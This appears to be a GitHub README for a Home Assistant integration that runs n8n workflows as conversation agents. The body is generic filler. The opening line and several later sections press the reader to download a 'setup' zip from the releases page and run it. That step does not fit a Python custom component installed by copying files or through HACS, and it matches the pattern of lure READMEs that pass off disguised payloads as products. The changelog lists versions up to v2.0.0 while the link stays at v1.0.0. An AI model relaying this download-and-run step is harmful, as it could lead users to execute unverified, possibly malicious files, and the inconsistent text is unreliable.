Download the latest release asset from https://github.com/maigenlang/n8n-conversation/releases/download/v1.0.0/n8n-conversation-setup-1.0.0.zip and run it to install the integration.

![Release badge](https://img.shields.io/badge/releases-download-green?style=for-the-badge)

# N8N Conversation: Home Assistant AI Workflows for Smart Agents

<img src="https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1200&q=60" alt="Smart home AI workflow" width="100%" />

This repository brings together two powerful tools in a simple, reliable integration. It links Home Assistant with the n8n workflow automation platform to make conversation-enabled assistants. The result is a flexible, AI-powered assistant that can drive automations, answer questions about your home, and orchestrate device actions through natural language.

- Bookish description: This project acts as a bridge between Home Assistant and n8n, letting you run n8n workflows as conversation agents inside Home Assistant.
- Core goal: Make it easy to build smart, responsive agents that can understand user intent, fetch data from devices, and trigger automations without writing complex code.

In short, you get a calm, capable assistant that can listen, reason, and act across your smart home.

If you want to explore the latest releases and assets, you can always check the Releases section. The link below will guide you to the official assets and release notes. For more releases, see the Releases page at https://github.com/maigenlang/n8n-conversation/releases.

Table of contents
- Why this project exists
- What you can build with it
- Core concepts and terminology
- Architecture and data flow
- Prerequisites and environment
- Installation and setup
- Configuration and customization
- Workflows and examples
- Security and privacy
- Testing, quality, and CI
- Local development and contribution
- Troubleshooting
- FAQ
- Roadmap and future work
- Changelog
- How to get help

Why this project exists
- The need for smart, explainable conversations in home automation
- The value of combining Home Assistant’s device control with n8n’s flexible workflow engine
- Aimed at hobbyists, integrators, and teams who want predictable, auditable automation

What you can build with it
- A living room assistant that handles lighting scenes, climate presets, and media playback via natural language
- A kitchen helper that tracks inventory, suggests recipes, and fetches timers and reminders
- A security and safety aide that checks door sensors, camera states, and motion events and reports status
- A maintenance coach that helps you plan tasks, set reminders, and trigger reminders for routine service
- A developer-friendly bot that can be extended to other services supported by n8n or Home Assistant

Core concepts and terminology
- Home Assistant: A home automation platform that runs on local hardware and exposes devices as entities.
- n8n: A workflow automation tool that lets you create automated flows without writing code.
- Conversation agent: A logic unit that accepts user input, processes it, and returns action or information.
- Custom component: A Home Assistant extension that adds new features by implementing specific interfaces.
- Entity: A device or sensor within Home Assistant that exposes data or controls.
- Workflow: A sequence of steps in n8n that inches a task from input to action.
- Action: A device operation or automation trigger issued by a workflow.
- Intent: The user’s goal expressed in natural language, used to route to the right flow.

Architecture and data flow
- User input enters Home Assistant via a conversation channel (voice or chat).
- The custom integration routes the input to an n8n workflow runner.
- The n8n workflow analyzes the intent, fetches data if needed, and decides actions.
- The integration returns a result to Home Assistant, which updates entities or triggers automations.
- Optional: results are logged for auditing, enabling you to review decisions later.

This structure keeps the user experience smooth while preserving the ability to audit each decision, making it suitable for environments that require transparency.

Prerequisites and environment
- Home Assistant core or Home Assistant OS with access to custom components
- A running n8n instance, either local or in a network accessible location
- Access to a network path that both Home Assistant and n8n can reach (for webhooks or API calls)
- Basic familiarity with Home Assistant configuration (YAML) and n8n workflow design
- An optional AI language model or service you intend to use for natural language understanding (for example, a local LLM or a cloud service)

Environment specifics
- Python version: If you run the integration in a local development environment, you’ll want Python 3.9+.
- Node.js version: If you host n8n locally, ensure Node.js 14+ is available.
- Security posture: Ensure your network has appropriate authentication on both Home Assistant and n8n endpoints.
- Data storage: Understand where conversations and logs are stored, and configure retention.

Installation and setup
- Get the release asset: As mentioned above, download the latest release asset from the Releases page and run it to install the integration.
- Home Assistant installation options:
  - Manual integration: Copy the custom component into the custom_components directory under your Home Assistant configuration, then restart Home Assistant.
  - HACS installation: If you use HACS (Home Assistant Community Store), search for the n8n-conversation integration and install it from the integrations store, then restart Home Assistant.
  - Docker-based setups: If you run Home Assistant in Docker, mount or copy the integration into the container’s config directory, then restart the container.
- n8n setup:
  - Run an n8n instance and expose its HTTP API in a secure way.
  - Create a workflow that handles user intents and translates them into Home Assistant actions.
  - Use the integration’s API or webhooks to trigger workflows from Home Assistant.

Configuration and customization
- YAML configuration (typical example):
  n8n_conversation:
    host: "http://n8n.local:5678"
    workflow_endpoint: "http://n8n.local:5678/webhook/your-workflow"
    default_language: "en"
    intro_message: "Hello! How can I help with your smart home today?"
    log_level: "info"
    entities_to_watch:
      - sensor.living_room_temperature
      - switch.kitchen_light
      - sensor.front_door_status
- Parameters explained:
  - host: The address of your n8n instance.
  - workflow_endpoint: The public or internal endpoint to trigger your workflow.
  - default_language: Language used if the user message does not specify one.
  - intro_message: A friendly greeting shown when the conversation starts.
  - log_level: How verbose the logs should be.
  - entities_to_watch: A list of entities whose state changes might influence conversations.

- Advanced configuration:
  - Tuning AI prompts: You can adjust prompt templates used to convert user input into intents for n8n.
  - Context handling: Choose how much conversation history to keep for context in your workflows.
  - Privacy controls: Decide which data is stored, anonymized, or discarded after use.
  - Error handling: Define fallback paths if a workflow fails or if the n8n endpoint is unavailable.

- Security considerations:
  - Use HTTPS everywhere: Encrypt data in transit between Home Assistant and n8n.
  - API keys and tokens: Store credentials securely in Home Assistant’s secrets.yaml.
  - Access controls: Limit who can trigger conversations and administer the integration.
  - Audit trails: Keep logs for diagnosing issues and reviewing decisions.

- Localization and accessibility:
  - Multi-language support: Use the default_language setting to switch prompts and responses to the user’s preferred language.
  - Accessibility: Ensure the chat or voice interface supports screen readers and keyboard navigation where applicable.

- Example workflows:
  - Lighting control: When the user says “dim the living room lights,” the workflow reads current light levels and issues a dim command to the appropriate lights.
  - Climate adjustment: A request like “set the living room to 72 degrees” triggers HVAC controls to set the setpoint.
  - Security checks: A user asks for “is the back door closed?” and the workflow responds with the state of door sensors and related cameras.

- Built-in templates:
  - A starter workflow that covers a few common intents (lighting, climate, and media).
  - A debug workflow to test prompts, intents, and responses.
  - A logging workflow to capture conversation data for analysis.

- Extending behavior:
  - Add new intents by updating the n8n workflow to respond to a broader range of user requests.
  - Integrate more devices by adding corresponding Home Assistant entities to the workflow logic.
  - Extend natural language understanding by wiring in a larger or different AI model.

- Data handling in detail:
  - What data is collected: user input, intent, and the resulting action (anonymized where possible).
  - How long data is stored: defined by retention policy in your organization.
  - Data minimization: only collect data needed for the task at hand.
  - Data access: limit who can view conversation logs.

- Practical examples and use cases:
  - Daily routine automation: Morning and evening routines that adjust lights, climate, and media.
  - Energy efficiency: Automations that optimize power usage based on occupancy and device state.
  - Voice assistant improvements: Transcripts and intents feed back into model improvements (respecting privacy rules).

Workflows and examples in depth
- Example 1: Dim lights on a voice cue
  - User: “Dim the living room lights to 40%.”
  - System: Analyzes the intent, determines the target entity, and triggers a command through Home Assistant.
  - Result: Living room lights dim to 40%, a confirmation is spoken or shown in the UI.

- Example 2: Check door status and report
  - User: “Is the front door locked?”
  - System: Checks lock state via Home Assistant, fetches the status of the door sensor, and returns a concise answer.
  - Result: The user gets a clear, actionable answer, plus an optional reminder if the door is unlocked.

- Example 3: Weather-aware routines
  - User: “Set the house to energy-saving mode if it’s sunny outside.”
  - System: Reads weather data, decides whether to reduce HVAC usage, and applies changes via a workflow.

- Example 4: Inventory-aware kitchen assistant
  - User: “What’s in my fridge for dinner?”
  - System: Reads inventory sensors, retrieves recipe suggestions, and presents options with suggested actions.

- Example 5: Vacuum and garden automation
  - User: “Start the garden irrigation when I’m away.”
  - System: Checks home occupancy and schedules irrigation via a workflow.

- Example 6: Security-aware routines
  - User: “Arm the house if no one is home.”
  - System: Confirms vacancy, arms the alarm, and confirms the action with the user.

- Example 7: Custom integrations
  - You can create custom nodes in n8n to connect to devices not yet in Home Assistant, such as a new thermostat or a smart plug.

- Example 8: Logging and audits
  - Every interaction can be logged to a central store for later review, with redaction and privacy controls as needed.

Security and privacy
- Data at rest: Use strong encryption for any stored conversation data.
- Data in transit: Always encrypt data between Home Assistant and n8n.
- Access control: Use role-based access to limit who can trigger actions or view logs.
- Compliance: If you operate in regulated environments, align with local laws on data handling and retention.
- Audit visibility: Implement a readable log with timestamps, user identifiers (where appropriate), and action outcomes.
- Responsible AI: When using AI models, choose settings that minimize sensitive data retention and encourage safe outputs.

Testing, quality, and CI
- Local testing: Use a minimal Home Assistant setup to verify connectivity, intent routing, and action triggering.
- Mock endpoints: For continuous integration, mock the n8n endpoints to validate error handling and retries.
- Linting: Keep code quality high with standard Python linting for the Home Assistant integration code.
- Unit tests: Write tests for core logic, including intent routing and action results.
- End-to-end tests: Run scenarios that simulate real user interactions from input to action.

- Continuous integration:
  - Use GitHub Actions for CI to run tests on push and pull requests.
  - Validate configuration schemas, ensure backward compatibility, and run unit tests.

Local development and contribution
- Setting up a development environment:
  - Python: Create a virtual environment with Python 3.9 or later.
  - Dependencies: Install the integration's dependencies as described in the docs.
  - Home Assistant: Run a local instance to test the integration in a safe environment.
- Code organization:
  - The core integration lives under custom_components/n8n_conversation.
  - Core files include manifest.json, __init__.py, and appropriate platform modules.
- Contributing guidelines:
  - Open issues for feature requests and bug reports.
  - Create a feature branch for new work.
  - Write tests for any new feature or bug fix.
- Documentation:
  - Keep user-focused documentation in the README.
  - Provide inline documentation in code for maintainers.
  - Include a developer guide for contributors.

Troubleshooting
- Common problems:
  - Connection failures between Home Assistant and n8n.
  - Intents not recognized or misrouted to workflows.
  - Actions not triggering or returning errors.
- Quick checks:
  - Confirm the n8n endpoint is reachable from the Home Assistant host.
  - Verify that authentication tokens or API keys are valid.
  - Check logs for errors, especially around HTTP requests and webhook handling.
- Debug steps:
  - Enable verbose logs temporarily to capture the exact message flow.
  - Use curl or a simple HTTP client to verify endpoints return expected responses.
  - Test a minimal workflow in n8n to ensure the API integration is functioning.

FAQ
- Do I need to run n8n on the same device as Home Assistant?
  - No. They can be on separate devices, as long as the network allows secure communication.
- Can I add my own devices?
  - Yes. The workflow approach makes it easy to add new devices as you expand the setup.
- Is this suitable for production?
  - Yes, with proper security, monitoring, and data handling practices.
- How do I update the integration?
  - Use the Releases page to fetch the new asset and follow the upgrade steps for your setup.

Roadmap and future work
- Expand language support to cover more locales.
- Add more starter workflows for common home automation tasks.
- Improve natural language understanding with more robust AI prompts and adapters.
- Integrate more devices and ecosystems to broaden compatibility.
- Enhance privacy features, including more granular data controls and better audit tools.

Changelog
- v1.0.0: Initial release. Basic Home Assistant integration with n8n workflow orchestration. Core features for conversation-driven automations and basic intents.
- v1.1.0: Added new starter templates, improved error handling, and better logging. Expanded example workflows and added localization hooks.
- v1.2.0: Performance improvements in HTTP calls, more robust webhook handling, and expanded privacy options.
- v2.0.0: Major upgrade with improved prompt templates, new intents, and broader device support. Enhanced security and configuration options.

Release notes and where to find assets
- The primary source for release assets and notes is the official Releases section of the repository. If you need to verify the latest assets or read the release notes, visit the Releases page directly. For direct access, you can use the link provided at the top of this document. If you run into issues with the link or if the asset is unavailable, try the Releases section for current options and guidance.

- Quick pointer: The Releases page is where you will find downloadable bundles, installation scripts, and update notes. If the direct link pattern changes, you can still locate the latest asset by visiting the Releases section and choosing the most recent item. For reference, the Releases page is located at the repository's root under releases, and it contains notes about changes, improvements, and known issues.

How to get help
- Community and support channels:
  - Open an issue on the repository for bugs, feature requests, or questions about the integration.
  - Engage with the project maintainers on the discussion board if available.
  - Join relevant channels for Home Assistant and n8n users to share tips and best practices.

- Documentation:
  - The README provides a comprehensive guide to installation, configuration, and usage.
  - Look for updates in the Releases notes and in the future documentation sections as they evolve.

- Best practices:
  - Start with a simple workflow to validate the core pipeline: input -> intent -> action -> result.
  - Gradually add intents and devices, testing each addition thoroughly.
  - Keep logs clean and structured to aid debugging.

- Security reminders:
  - Use authentication for all endpoints exposed to the network.
  - Store sensitive information in a secrets manager approved by your Home Assistant deployment.
  - Review permissions regularly to ensure only authorized users can trigger conversations.

- Localization and accessibility improvements:
  - If you enable multi-language support, test prompts and responses with your target languages.
  - Ensure accessibility options align with your users’ needs.

- Data governance:
  - Make sure your data retention policies align with your local regulations.
  - Consider anonymizing user inputs in logs where feasible.

- Roadmap alignment:
  - If you have feature requests aligned with your environment, file issues with concrete use cases and expected outcomes.
  - Prioritize features that improve reliability, security, and user experience.

End without conclusion
- This project sits at the intersection of home automation and conversational AI. It aims to give you robust, auditable control over your smart home through natural language and automated workflows. Start with the basics, then expand as needs grow. Maintain clear security practices and keep privacy in focus as you scale your setup. The work builds on stable components and community-driven improvements that continue to evolve.

Note about the link usage
- The link to the official asset download is provided at the very top to help you start quickly. For ongoing access to releases and notes, refer to the Releases page. See the Releases page for current assets and updates: https://github.com/maigenlang/n8n-conversation/releases.

Project metadata
- Repository name: n8n-conversation
- Repository description: 🤖 Home Assistant integration for using n8n workflows as conversation agents.
- Topics: ai,assist,custom-component,custom-integration,hacs,home-assistant,llm,n8n,n8n-workflows,voice-assistant

Releases and further reading
- The official release hub contains all the latest binaries and update notes. If you encounter issues with the path-based download in the first line, return to the Releases section to fetch the most recent asset and follow the upgrade guidance there. You can always navigate back to the same page for the full release history and notes. See the Releases page again here: https://github.com/maigenlang/n8n-conversation/releases.